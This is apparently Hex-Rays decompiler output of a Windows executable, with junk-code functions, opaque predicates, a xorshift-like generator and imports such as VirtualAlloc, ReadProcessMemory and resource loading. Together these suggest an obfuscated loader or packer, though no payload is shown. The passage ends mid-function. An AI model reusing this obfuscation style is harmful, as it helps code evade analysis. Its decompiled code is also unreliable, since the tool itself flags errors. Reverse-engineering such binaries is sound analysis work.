/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

// int __usercall sub_401296@<eax>(int@<eax>);
// int __usercall sub_401398@<eax>(int@<eax>);
// int __usercall sub_401796@<eax>(int@<eax>, int@<ebp>);
int sub_401814();
// int __usercall sub_401D12@<eax>(int *@<eax>, unsigned int@<edx>, unsigned int@<ecx>, __int128);
// int __usercall sub_401F0C@<eax>(int@<eax>);
// int __usercall sub_402288@<eax>(int@<eax>);
// int __usercall sub_402498@<eax>(int@<eax>);
// int __usercall sub_402843@<eax>(int@<eax>);
// int __usercall sub_402C7C@<eax>(int@<eax>);
// int __usercall sub_402CB7@<eax>(int@<eax>);
// int __usercall sub_402D25@<eax>(int@<eax>);
// int __usercall sub_402DE4@<eax>(int@<eax>);
// unsigned int __usercall sub_402DFC@<eax>(int a1@<eax>, __int128 a2);
// int __usercall sub_40313E@<eax>(int@<eax>);
// int __usercall sub_403544@<eax>(int@<eax>);
int sub_403909();
_DWORD start(); // weak
// int __usercall sub_403D89@<eax>(int@<eax>);
// int __usercall sub_403DC3@<eax>(int@<eax>, int@<ebp>);
// int __usercall sub_4043F4@<eax>(int@<eax>);
// int __usercall sub_40469F@<eax>(int@<eax>);
// unsigned int __usercall sub_4048CC@<eax>(int@<edx>, int@<ebx>);
// int __usercall sub_4048E5@<eax>(int@<eax>, int@<ebp>);
// int __usercall sub_4049F9@<eax>(int@<eax>, int@<ebp>);
// int __usercall sub_404BE6@<eax>(int@<eax>);
// int __usercall sub_404F27@<eax>(int@<eax>);
// int __usercall sub_404FF1@<eax>(int@<eax>);
// int __usercall sub_405230@<eax>(int@<eax>);
// int __usercall sub_405BAA@<eax>(int@<eax>);
int sub_405BF5();
int sub_406118();
// int __usercall sub_4061F1@<eax>(int@<eax>);
// int __usercall sub_4062A9@<eax>(int@<eax>);
// int __usercall sub_406329@<eax>(int@<eax>);
// int __usercall sub_4064CF@<eax>(int@<eax>);
// char *__usercall sub_407259@<eax>(int@<esi>);
unsigned __int8 __cdecl sub_407280(_BYTE *, unsigned int, int);
struct _LIST_ENTRY *sub_4076FF();
// int __userpurge sub_40777B@<eax>(int@<eax>, unsigned __int8 *@<edx>, _DWORD *@<ebp>, unsigned int *@<edi>, int@<esi>, int, int, int);
int __cdecl sub_407DB4(int, int, _BYTE *);
_BYTE *__cdecl sub_408882(_BYTE *, _BYTE *);
// void __usercall sub_4089A1(unsigned int@<ecx>, void *@<edi>, const void *@<esi>);
// char *__usercall sub_408A45@<eax>(int@<edx>, int@<ebx>);
unsigned int __cdecl sub_4094E4(_BYTE *);
char *__cdecl sub_40962D(int);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN unk_420EE6; // weak
_UNKNOWN unk_420FE6; // weak
int dword_43E004 = 0; // weak
int dword_43E008 = 0; // weak
int dword_43E00C = 0; // weak
int dword_43E010 = 0; // weak
int dword_43E014 = 0; // weak
int dword_43E018 = 0; // weak
int dword_43E01C = 0; // weak
int dword_43E020 = 0; // weak
int dword_43E024 = 0; // weak
int dword_43E028 = 0; // weak
int dword_43E02C = 0; // weak
int dword_43E030 = 0; // weak
int dword_43E034 = 0; // weak
int dword_43E03C = 0; // weak
int dword_43E040 = 0; // weak
int dword_43E044 = 0; // weak
int dword_43E048 = 0; // weak
int dword_43E04C = 0; // weak
int dword_43E1F8 = 0; // weak
int dword_43E2C4 = 0; // weak
char byte_43E390 = '\0'; // weak
int dword_43E430 = 0; // weak
int dword_43E57C = 0; // weak
int dword_43E730 = 45160; // weak
int dword_43E83C = 1140574115; // weak
int dword_43E8D0 = 467200000; // weak
int dword_43E9B4 = -521647035; // weak
int dword_43EA1C = -532931327; // weak
int dword_43EA28 = 50349024; // weak
int dword_43EA54 = -437714944; // weak
int dword_43EBBC = -535034426; // weak
int dword_43EBE8 = -385875871; // weak
char byte_43EC80 = 'd'; // weak
int dword_43ED00 = 1138770949; // weak
int dword_43ED5C = 1145642381; // weak
char byte_43ED68 = '\x1D'; // weak
int dword_43EE7C = 809107455; // weak
int dword_43EEB4 = 7716287; // weak
int dword_43EFB0 = 93126656; // weak
int dword_43F068 = 1946174452; // weak
int dword_43F3F0 = 269288191; // weak
int dword_43F46C = 63111424; // weak
char byte_43F470 = '5'; // weak
int dword_43F5A8 = -256523776; // weak
char byte_43F644 = '‰'; // weak
int dword_43F74C = -1996488702; // weak
int dword_43F7C4 = -63110401; // weak
int dword_43F9D8 = -333; // weak
int dword_43FAEC = 1032519680; // weak
int dword_43FB56 = 0; // weak
_UNKNOWN unk_43FB5A; // weak
int (__fastcall *dword_43FB62)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_43FB8E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__fastcall *dword_43FBA1)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
_UNKNOWN unk_43FBC1; // weak
int dword_43FBD3 = 0; // weak
int dword_43FBD7 = 114420; // weak
int dword_43FBE3 = 362436069; // weak
int dword_43FBEB = -1391599407; // weak
int (__fastcall *dword_43FBEF)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__thiscall *dword_43FC03)(_DWORD) = NULL; // weak
int dword_43FC0B = 0; // weak
int dword_43FC23 = 521288629; // weak
int dword_43FC27 = 0; // weak
__int64 (__thiscall *dword_43FC33)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_43FC43)(_DWORD) = NULL; // weak
_UNKNOWN unk_43FC5B; // weak
int dword_43FD5A = 0; // weak
int (__fastcall *dword_43FD72)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__thiscall *dword_43FD7E)(_DWORD, _DWORD, _DWORD) = NULL; // weak
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern HRSRC (__stdcall *FindResourceA)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
// extern UINT (__stdcall *GetACP)();
// extern BOOL (__stdcall *GetCPInfo)(UINT CodePage, LPCPINFO lpCPInfo);
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern UINT (__stdcall *GetOEMCP)();
// extern void (__stdcall *GetSystemTime)(LPSYSTEMTIME lpSystemTime);
// extern HGLOBAL (__stdcall *LoadResource)(HMODULE hModule, HRSRC hResInfo);
// extern BOOL (__stdcall *QueryPerformanceCounter)(LARGE_INTEGER *lpPerformanceCount);
// extern BOOL (__stdcall *ReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
// extern DWORD (__stdcall *SearchPathA)(LPCSTR lpPath, LPCSTR lpFileName, LPCSTR lpExtension, DWORD nBufferLength, LPSTR lpBuffer, LPSTR *lpFilePart);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);


//----- (00401296) --------------------------------------------------------
int __usercall sub_401296@<eax>(int a1@<eax>)
{
  if ( a1 % 100 < 26 )
    return 212;
  else
    return 105;
}

//----- (00401398) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_401398@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_4048E5(a1, (int)&savedregs);
}
// 40139B: bad sp value at call

//----- (00401796) --------------------------------------------------------
int __usercall sub_401796@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int v3; // edx

  *(_DWORD *)(a2 - 36) = 12;
  *(_DWORD *)(a2 - 28) = 17;
  *(_DWORD *)(a2 - 40) = 78;
  *(_DWORD *)(a2 - 24) = 120;
  *(_DWORD *)(a2 - 4) = 16;
  *(_DWORD *)(a2 - 44) = 57;
  *(_DWORD *)(a2 - 32) = 78;
  *(_DWORD *)(a2 - 16) = 45;
  *(_DWORD *)(a2 - 52) = 78;
  *(_DWORD *)(a2 - 8) = 78;
  *(_DWORD *)(a2 - 20) = 78;
  *(_DWORD *)(a2 - 12) = 235;
  v3 = a1 % 83;
  *(_DWORD *)(a2 - 48) = v3;
  if ( v3 < 29 )
    return 6;
  else
    return 198;
}

//----- (00401814) --------------------------------------------------------
int sub_401814()
{
  int v1; // eax
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  sub_402288(234);
  v1 = dword_43FBD7 ^ (dword_43FBD7 << 11);
  v2 = v1;
  dword_43FBD7 = dword_43FBE3;
  dword_43FBE3 = dword_43FC23;
  sub_402288(v1);
  dword_43FC23 = unk_43FB5A;
  unk_43FB5A ^= (v2 >> 8) ^ v2 ^ (unk_43FB5A >> 19);
  return unk_43FB5A;
}
// 43FBD7: using guessed type int dword_43FBD7;
// 43FBE3: using guessed type int dword_43FBE3;
// 43FC23: using guessed type int dword_43FC23;

//----- (00401D12) --------------------------------------------------------
// local variable allocation has failed, the output may be wrong!
int __usercall sub_401D12@<eax>(int *a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>, __int128 a4)
{
  int result; // eax
  unsigned int v5; // edx
  char *v6; // ecx
  int v7; // ecx
  unsigned int v8; // ecx
  unsigned int v9; // ecx
  int *v10; // ecx
  int v11; // edx
  int v12; // eax
  unsigned int v13; // eax
  int v14; // edx
  int v15; // ecx
  BOOL v16; // eax
  int v17; // ecx
  int v18; // edx
  __int16 v19; // cx
  __int16 v20; // cx
  char *v21; // ecx
  int v22; // [esp+39h] [ebp-3A7h]
  int v23; // [esp+E4h] [ebp-2FCh]
  int v24; // [esp+ECh] [ebp-2F4h]
  int v25; // [esp+118h] [ebp-2C8h]
  int v26; // [esp+160h] [ebp-280h] BYREF
  __int16 v27; // [esp+168h] [ebp-278h]
  int v28[2]; // [esp+16Ch] [ebp-274h]
  int v29; // [esp+174h] [ebp-26Ch]
  int v30; // [esp+1A4h] [ebp-23Ch]
  int v31; // [esp+1C4h] [ebp-21Ch]
  int v32; // [esp+1D4h] [ebp-20Ch]
  int v33; // [esp+1DCh] [ebp-204h]
  char v34; // [esp+1F8h] [ebp-1E8h]
  int v35; // [esp+21Ch] [ebp-1C4h]
  char v36; // [esp+228h] [ebp-1B8h] BYREF
  char v37; // [esp+238h] [ebp-1A8h]
  int v38[12]; // [esp+24Ch] [ebp-194h] BYREF
  int v39; // [esp+298h] [ebp-148h]
  int v40; // [esp+2CCh] [ebp-114h]
  __int16 v41; // [esp+2E0h] [ebp-100h]
  int v42; // [esp+2ECh] [ebp-F4h]
  LARGE_INTEGER PerformanceCount; // [esp+304h] [ebp-DCh] BYREF
  int v44; // [esp+318h] [ebp-C8h]
  char v45; // [esp+334h] [ebp-ACh]
  char v46; // [esp+360h] [ebp-80h]
  int v47; // [esp+384h] [ebp-5Ch]
  int v48; // [esp+3ACh] [ebp-34h]
  char v49; // [esp+3CCh] [ebp-14h]
  char v50; // [esp+3D0h] [ebp-10h]
  int savedregs; // [esp+3E0h] [ebp+0h] BYREF
  void *retaddr; // [esp+3E4h] [ebp+4h] OVERLAPPED

  v41 ^= 0x43u;
  if ( a1 != (int *)960 )
  {
    a1 = &savedregs;
    a3 |= *(unsigned int *)((char *)&retaddr + 3);
    a2 ^= *(_DWORD *)((char *)&a4 + 5);
    v45 ^= 0x1Eu;
  }
  v19 = a3 - 11294 + (a3 < 0x2C1E) + a3 - 11294;
  if ( (int *)a2 != a1 )
    goto LABEL_30;
  v20 = v31 + v19;
  LOBYTE(v47) = v47 + 39;
  v15 = (v20 & 0x2202) - (_DWORD)retaddr;
  if ( !v15 )
  {
    v34 += 39;
    v9 = -v23;
    v40 -= v23;
    if ( -v23 != 624 )
    {
LABEL_25:
      v15 = v38[0] + v9;
      v39 += (int)v38;
      v35 -= 255;
      goto LABEL_26;
    }
    v29 += 624;
    v35 -= 624;
LABEL_30:
    v31 -= 40;
    v9 = *(_DWORD *)((char *)&a4 + 3) ^ (unsigned int)&v36;
    goto LABEL_25;
  }
LABEL_26:
  v28[0] ^= v15;
  v16 = QueryPerformanceCounter(&PerformanceCount);
  v11 = v48 + v18;
  v47 |= v16;
  v12 = v44 | v16;
  v10 = (int *)(v25 | v17);
  if ( v11 )
  {
    v10 = &v26;
    v11 += *(int *)((char *)v28 + 2);
    v50 |= 0x86u;
    v12 = (unsigned __int16)v30 & (unsigned __int16)(v27 ^ v12) & 0x2695;
  }
  v21 = (char *)v10 - 11215;
  v6 = v21 + 3641;
  v46 |= 0x39u;
  if ( v26 != v11 )
  {
    v33 ^= 0x20u;
    v6 += v12;
  }
  if ( v12 )
    goto LABEL_6;
  v7 = *(_DWORD *)((char *)&a4 + 3) + (*(_DWORD *)((char *)&a4 + 5) | (unsigned int)v6);
  if ( &savedregs == (int *)v7 )
    goto LABEL_6;
  v8 = (*(_DWORD *)((_BYTE *)&a4 + 2) & v7) - *(_DWORD *)((char *)&retaddr + 2) - (_DWORD)&savedregs;
  if ( v8 == 90 )
    goto LABEL_6;
  v5 = *(_DWORD *)((char *)&a4 + 1) ^ (v22
                                     + ((*(_DWORD *)((char *)&a4 + 6) | (unsigned int)&savedregs | 0x24BB) < v8)
                                     + (*(_DWORD *)((char *)&a4 + 6) | (unsigned int)&savedregs | 0x24BB));
  v13 = v5 & (*(_DWORD *)((char *)&a4 + 6) ^ (unsigned int)&savedregs);
  v47 ^= v13;
  if ( v13 != 621 )
  {
    v14 = v24 | (v5 + 15172);
    if ( (v32 | v14) == v13 )
      goto LABEL_6;
    v49 |= 0xD3u;
    if ( v13 )
    {
      LOWORD(v33) = v33 & 0xCE;
LABEL_6:
      v37 &= 0xE4u;
    }
  }
  result = 0;
  v42 &= 0x3Cu;
  return result;
}
// 401D12: variables would overlap: ^3E8.4(retaddr) and ^3EA.4,^3EB.4
// 401D12: using guessed type _DWORD var_194[12];
// 401D12: using guessed type _DWORD var_274[2];

//----- (00401F0C) --------------------------------------------------------
int __usercall sub_401F0C@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2
  int v4; // eax

  v2 = a1 % 66;
  v1 = a1 / 66;
  if ( v2 >= 25 )
    return 77;
  v4 = sub_402288(v1);
  sub_402D25(v4);
  return 708;
}
// 40339A: conditional instruction was optimized away because %var_10.4==9A
// 4033A0: conditional instruction was optimized away because %var_10.4==9A
// 404426: conditional instruction was optimized away because %var_1C.4==BD
// 40442C: conditional instruction was optimized away because %var_1C.4==BD
// 405E5C: conditional instruction was optimized away because %var_20.4==FF
// 405E62: conditional instruction was optimized away because %var_20.4==FF

//----- (00402288) --------------------------------------------------------
int __usercall sub_402288@<eax>(int a1@<eax>)
{
  if ( a1 % 9 < 20 )
    return 639;
  else
    return 194;
}

//----- (00402498) --------------------------------------------------------
int __usercall sub_402498@<eax>(int a1@<eax>)
{
  if ( a1 % 72 < 21 )
    return 131;
  else
    return 72;
}
// 4054F0: conditional instruction was optimized away because edx.4==19

//----- (00402843) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_402843@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_4049F9(a1, (int)&savedregs);
}
// 402846: bad sp value at call

//----- (00402C7C) --------------------------------------------------------
int __usercall sub_402C7C@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2

  v2 = a1 % 254;
  v1 = a1 / 254;
  if ( v2 >= 11 )
    return 13;
  sub_402288(v1);
  return 402;
}
// 40418E: conditional instruction was optimized away because %var_18.4==FB
// 404194: conditional instruction was optimized away because %var_18.4==FB

//----- (00402CB7) --------------------------------------------------------
int __usercall sub_402CB7@<eax>(int a1@<eax>)
{
  if ( a1 % 5 < 29 )
    return 284;
  else
    return 0;
}
// 405332: conditional instruction was optimized away because %var_2C.4==F5
// 406894: conditional instruction was optimized away because %var_2C.4==F5
// 406E53: conditional instruction was optimized away because %var_18.4==9E

//----- (00402D25) --------------------------------------------------------
int __usercall sub_402D25@<eax>(int a1@<eax>)
{
  int v2; // eax
  int v3; // edx
  int v4; // et2

  v4 = a1 % 98;
  v2 = a1 / 98;
  v3 = v4;
  if ( v3 >= 32 )
    return 108;
  sub_403544(v2);
  return 255;
}
// 406133: conditional instruction was optimized away because %var_4.4==F7

//----- (00402DE4) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_402DE4@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_401796(a1, (int)&savedregs);
}
// 402DE7: bad sp value at call

//----- (00402DFC) --------------------------------------------------------
// local variable allocation has failed, the output may be wrong!
unsigned int __usercall sub_402DFC@<eax>(int a1@<eax>, __int128 a2)
{
  int v2; // ecx
  int v3; // edx
  int v4; // edx
  unsigned int v5; // ecx
  char *v6; // eax
  unsigned int v7; // edx
  int v8; // ecx
  int v9; // edx
  int v10; // ecx
  unsigned int v11; // edx
  int v12; // ecx
  int v13; // edx
  int v14; // edx
  int v15; // ecx
  bool v16; // cf
  int v17; // edx
  int v18; // ecx
  int v19; // eax
  int v20; // edx
  unsigned int v21; // eax
  int v22; // edx
  int v23; // edx
  unsigned int v24; // ecx
  int v25; // edx
  int *v26; // eax
  int v27; // edx
  unsigned int v28; // edx
  int v29; // ecx
  unsigned int v30; // eax
  unsigned int result; // eax
  int v32; // eax
  int v33; // eax
  unsigned int v34; // ecx
  int v35; // eax
  unsigned int v36; // eax
  int v37; // ecx
  int v38; // eax
  unsigned int v39; // edx
  int v40; // edx
  unsigned int v41; // ecx
  unsigned int v42; // eax
  int v43; // edx
  unsigned int v45; // edx
  unsigned int v46; // eax
  unsigned int v47; // ecx
  int v48; // ecx
  BOOL v49; // eax
  int v50; // edx
  int v51; // eax
  char *v52; // ecx
  int v53; // ecx
  int v54; // ecx
  unsigned int v55; // edx
  char *v56; // eax
  int v57; // edx
  int v58; // ecx
  int v59; // edx
  int v60; // ecx
  int v61; // ecx
  int v62; // eax
  int v63; // eax
  int v64; // eax
  unsigned int v65; // ecx
  int v66; // ecx
  __int16 v67; // ax
  unsigned int v68; // ecx
  unsigned int v69; // ecx
  unsigned int v70; // eax
  int v71; // edx
  int v72; // eax
  unsigned int v73; // edx
  unsigned int v74; // kr00_4
  int v75; // ecx
  int v76; // eax
  unsigned int v77; // ecx
  __int64 v78; // [esp+Ch] [ebp-31Ch] BYREF
  int v79; // [esp+14h] [ebp-314h]
  int v80; // [esp+18h] [ebp-310h]
  char v81; // [esp+1Ch] [ebp-30Ch] BYREF
  int v82; // [esp+24h] [ebp-304h]
  int v83; // [esp+30h] [ebp-2F8h]
  char v84; // [esp+40h] [ebp-2E8h]
  int v85; // [esp+44h] [ebp-2E4h]
  char v86; // [esp+4Ch] [ebp-2DCh]
  _TBYTE *v87; // [esp+54h] [ebp-2D4h]
  int v88; // [esp+5Ch] [ebp-2CCh] BYREF
  char v89[6]; // [esp+60h] [ebp-2C8h] BYREF
  _BYTE v90[6]; // [esp+66h] [ebp-2C2h]
  _BYTE v91[6]; // [esp+6Ch] [ebp-2BCh]
  _BYTE v92[6]; // [esp+72h] [ebp-2B6h]
  __int16 v93[2]; // [esp+7Ch] [ebp-2ACh] BYREF
  __int64 v94; // [esp+80h] [ebp-2A8h]
  int v95; // [esp+88h] [ebp-2A0h]
  char v96; // [esp+8Ch] [ebp-29Ch]
  char v97; // [esp+90h] [ebp-298h] BYREF
  int v98; // [esp+98h] [ebp-290h]
  _TBYTE v99; // [esp+9Eh] [ebp-28Ah] BYREF
  int v100; // [esp+AFh] [ebp-279h]
  int v101; // [esp+B4h] [ebp-274h]
  char v102; // [esp+BCh] [ebp-26Ch]
  char v103[11]; // [esp+C0h] [ebp-268h] BYREF
  int v104; // [esp+CBh] [ebp-25Dh] BYREF
  int v105; // [esp+D0h] [ebp-258h]
  int v106; // [esp+DCh] [ebp-24Ch]
  int v107; // [esp+E0h] [ebp-248h]
  __int16 v108; // [esp+E4h] [ebp-244h]
  int v109; // [esp+E8h] [ebp-240h]
  __int16 v110; // [esp+ECh] [ebp-23Ch]
  __int16 v111; // [esp+F0h] [ebp-238h]
  int v112; // [esp+F8h] [ebp-230h] BYREF
  int v113; // [esp+FCh] [ebp-22Ch] BYREF
  int v114[2]; // [esp+104h] [ebp-224h]
  char v115; // [esp+10Ch] [ebp-21Ch] BYREF
  int v116; // [esp+110h] [ebp-218h]
  __int16 v117; // [esp+114h] [ebp-214h]
  int v118; // [esp+116h] [ebp-212h]
  int v119[2]; // [esp+11Ch] [ebp-20Ch] BYREF
  _BYTE v120[12]; // [esp+124h] [ebp-204h]
  char v121; // [esp+134h] [ebp-1F4h]
  int v122; // [esp+138h] [ebp-1F0h]
  unsigned int v123; // [esp+144h] [ebp-1E4h]
  int v124; // [esp+148h] [ebp-1E0h]
  int v125; // [esp+150h] [ebp-1D8h]
  int v126; // [esp+154h] [ebp-1D4h] BYREF
  int v127; // [esp+158h] [ebp-1D0h] BYREF
  int v128[2]; // [esp+164h] [ebp-1C4h]
  int v129; // [esp+16Ch] [ebp-1BCh]
  int v130; // [esp+170h] [ebp-1B8h]
  int v131; // [esp+180h] [ebp-1A8h]
  int v132; // [esp+194h] [ebp-194h]
  int v133; // [esp+198h] [ebp-190h]
  int v134; // [esp+1A8h] [ebp-180h]
  _BYTE v135[6]; // [esp+1AEh] [ebp-17Ah]
  int v136; // [esp+1B4h] [ebp-174h]
  int v137; // [esp+1BCh] [ebp-16Ch]
  char v138[16]; // [esp+1C4h] [ebp-164h] BYREF
  int v139; // [esp+1D4h] [ebp-154h]
  int v140; // [esp+1E8h] [ebp-140h]
  int v141; // [esp+1F4h] [ebp-134h]
  int v142; // [esp+1FCh] [ebp-12Ch]
  char v143; // [esp+200h] [ebp-128h]
  int v144; // [esp+204h] [ebp-124h]
  __int64 v145; // [esp+210h] [ebp-118h]
  int v146; // [esp+218h] [ebp-110h]
  int v147; // [esp+220h] [ebp-108h] BYREF
  int v148; // [esp+224h] [ebp-104h]
  LARGE_INTEGER PerformanceCount; // [esp+228h] [ebp-100h] BYREF
  int v150; // [esp+240h] [ebp-E8h]
  int v151; // [esp+24Ch] [ebp-DCh]
  LARGE_INTEGER v152; // [esp+258h] [ebp-D0h] BYREF
  int v153; // [esp+260h] [ebp-C8h]
  _BYTE v154[7]; // [esp+268h] [ebp-C0h] BYREF
  __int16 v155; // [esp+270h] [ebp-B8h]
  int v156; // [esp+274h] [ebp-B4h]
  _BYTE v157[6]; // [esp+27Ah] [ebp-AEh]
  int v158; // [esp+288h] [ebp-A0h]
  int v159; // [esp+290h] [ebp-98h]
  int v160; // [esp+298h] [ebp-90h]
  int v161; // [esp+29Ch] [ebp-8Ch]
  int v162[5]; // [esp+2A8h] [ebp-80h] BYREF
  __int16 v163; // [esp+2BCh] [ebp-6Ch]
  int v164; // [esp+2CCh] [ebp-5Ch]
  int v165; // [esp+2D0h] [ebp-58h]
  int v166; // [esp+2D4h] [ebp-54h]
  int v167; // [esp+2D8h] [ebp-50h]
  int v168; // [esp+2DCh] [ebp-4Ch]
  int v169; // [esp+2E0h] [ebp-48h]
  int v170; // [esp+2ECh] [ebp-3Ch]
  int v171; // [esp+2F4h] [ebp-34h]
  _DWORD *v172; // [esp+2F8h] [ebp-30h]
  char *v173; // [esp+2FCh] [ebp-2Ch]
  int v174; // [esp+300h] [ebp-28h]
  int v175; // [esp+308h] [ebp-20h]
  int v176; // [esp+30Ch] [ebp-1Ch]
  int v177; // [esp+310h] [ebp-18h]
  int v178; // [esp+318h] [ebp-10h]
  int savedregs; // [esp+328h] [ebp+0h] OVERLAPPED BYREF
  unsigned int retaddr; // [esp+32Ch] [ebp+4h] OVERLAPPED

  v38 = *(_DWORD *)((_BYTE *)&v145 + 1) & a1;
  v39 = (unsigned int)&savedregs - 1755;
  if ( !v38 )
    v39 &= v162[2];
  v147 |= v39;
  *(_DWORD *)v154 &= v38;
  v35 = v38 | 0x122A;
  if ( v35 == v134 )
    goto LABEL_37;
  v46 = v39 + (v35 & 0x23E3);
  v47 = (unsigned int)v89;
  v71 = *(_DWORD *)&v91[2] + (v113 ^ v39) - *(_DWORD *)v91;
  if ( v71 == v46 )
  {
LABEL_86:
    LOWORD(v133) = v133 ^ 0xDA;
    LODWORD(v94) = v94 - v46;
    v39 = (unsigned int)&savedregs;
    v35 = ((*(_DWORD *)((_BYTE *)&a2 + 3) & (retaddr | v46 | (unsigned int)v89)) - a2) & (DWORD2(a2) | v46);
LABEL_37:
    v47 = (unsigned int)v103;
    v71 = v39 - v35;
    v121 += 71;
LABEL_27:
    v156 += v47;
    v71 ^= v104;
    v46 = (unsigned int)&v127;
    v47 = v71 & (unsigned int)&v103[-*(int *)((char *)v128 + 2)];
LABEL_72:
    v45 = v47 + (v145 & v71);
    goto LABEL_12;
  }
  v114[0] = v114[0] & 0xC8;
  v155 += 222;
  v83 ^= v46;
  if ( v166 != v71 )
    goto LABEL_27;
  if ( v71 == 686 )
    goto LABEL_72;
  v163 &= 0xDFu;
  *(_DWORD *)v154 &= (unsigned int)v89;
  v45 = v71 - v176;
  v46 = (unsigned int)&v112;
  if ( &v112 )
  {
    v120[4] -= 26;
    v134 |= 0xDFu;
    LOBYTE(v105) = v105 & 0x5A;
    v46 = (unsigned int)&v112 | 0x247F;
    goto LABEL_86;
  }
LABEL_12:
  v110 &= 0xC1u;
  v15 = v156 | (*(_DWORD *)&v154[3] + ((__PAIR64__(v47, v46) - __PAIR64__(v45, 11892)) >> 32));
  v16 = __CFADD__(v15, 10886);
  v15 += 10886;
  v17 = (*(_DWORD *)v157 | *(_DWORD *)&v154[2] | v45 | 0x3179) - (v16 + v15);
  v18 = (v167 ^ v15) + 745;
  v19 = v145 ^ (unsigned int)&v154[4];
  v9 = (v145 ^ (unsigned int)&v154[4]) + v17;
  if ( v18 != v9 )
    goto LABEL_3;
  *(_DWORD *)&v90[2] &= v19;
  v76 = v19 - v9;
  v65 = v18 - v9;
  if ( v76 == 850 )
    goto LABEL_76;
  LOWORD(v125) = v125 & 0xC6;
  v4 = (int)&v99 + 2;
  v69 = v100 + DWORD1(v99) + v65;
  if ( (_TBYTE *)((char *)&v99 + 2) == v87 )
  {
LABEL_79:
    *(_DWORD *)v120 = v120[0] & 0xED;
    v76 = (int)&v78;
    v65 = (unsigned int)&savedregs + *(_DWORD *)((char *)&v78 + 1) - v79;
LABEL_76:
    v117 ^= 4u;
    v75 = v159 & v65;
    goto LABEL_38;
  }
  v128[0] ^= 0x49u;
  v70 = v69 | ((unsigned int)&v99 + ((_TBYTE *)((char *)&v99 + 2) < v87) + v76 + 2);
  v102 |= 0xC7u;
  v5 = v70 + v69;
  if ( v70 == PerformanceCount.LowPart )
    goto LABEL_36;
  v132 += v5;
  v165 ^= v5;
  LOWORD(v127) = v127 ^ 0xFA;
  v105 -= v70;
  v76 = *(_DWORD *)&v90[2] | v124 & *(_DWORD *)((_BYTE *)&v99 + 6) & v70;
  if ( v5 == v125 )
    goto LABEL_49;
  v53 = v5 | 0x6B;
  v116 ^= v53;
  v167 -= 91;
  v106 &= v76;
  LOBYTE(v85) = v85 ^ 0x12;
  v4 = (((unsigned int)&v99 + 2) & 0xCDC) + 3292;
  v68 = v53 & 0x335E;
  if ( !v76 )
    goto LABEL_16;
  v74 = (v137 ^ v68 & 0x2634) + v4;
  v75 = v74 + (((v137 ^ v68 & 0x2634) + __PAIR64__(v137 ^ v68 & 0x2634, v4)) >> 32);
  if ( v74 == PerformanceCount.HighPart )
  {
    v101 &= 0x15u;
    if ( &savedregs == (int *)708 )
      v171 ^= 0x33u;
    v171 |= 0x55u;
    v164 += (int)&savedregs;
    v106 &= (unsigned int)&savedregs;
    goto LABEL_79;
  }
LABEL_38:
  v76 = *(_DWORD *)((_BYTE *)&a2 + 7) & (v76 ^ 0xEF0);
  v4 = (int)&savedregs - v75;
LABEL_49:
  v76 |= v118;
  v108 += 192;
  v68 = v79 & ((unsigned int)&v115 | 0x12C0);
LABEL_16:
  v23 = v4 ^ 0x3384;
  v63 = v23 & v76;
  LOWORD(v98) = v98 | 0xC4;
  v9 = v23 - 7856;
  v130 ^= v63;
  v168 &= v68;
LABEL_3:
  v86 &= 0x81u;
  v4 = v162[4] | v9;
  v5 = ((unsigned int)&v119[1] + v107) ^ 0x3D0E;
LABEL_36:
  LOWORD(v131) = v131 + 14;
  v40 = v4 - 8563;
  WORD2(v78) -= 185;
  v41 = v40 + (v5 | 0x804);
  v42 = v40 | (unsigned int)v162;
  LOBYTE(v166) = v166 | 0xB0;
  v114[0] &= v40;
  v43 = v40 + 2443;
  if ( v42 - v41 == 0xAFD )
  {
    v157[2] ^= 0xA9u;
    v165 ^= v43;
  }
  v36 = QueryPerformanceCounter(&PerformanceCount);
  if ( v37 == v146 )
  {
    v106 |= 0x99u;
    v26 = (int *)(savedregs & *(unsigned int *)((char *)&retaddr + 2) & v36);
    if ( &savedregs == (int *)273 )
    {
      v32 = (int)&v126;
      if ( (int *)((char *)&savedregs - v148) != v172 )
        goto LABEL_18;
      v26 = &savedregs;
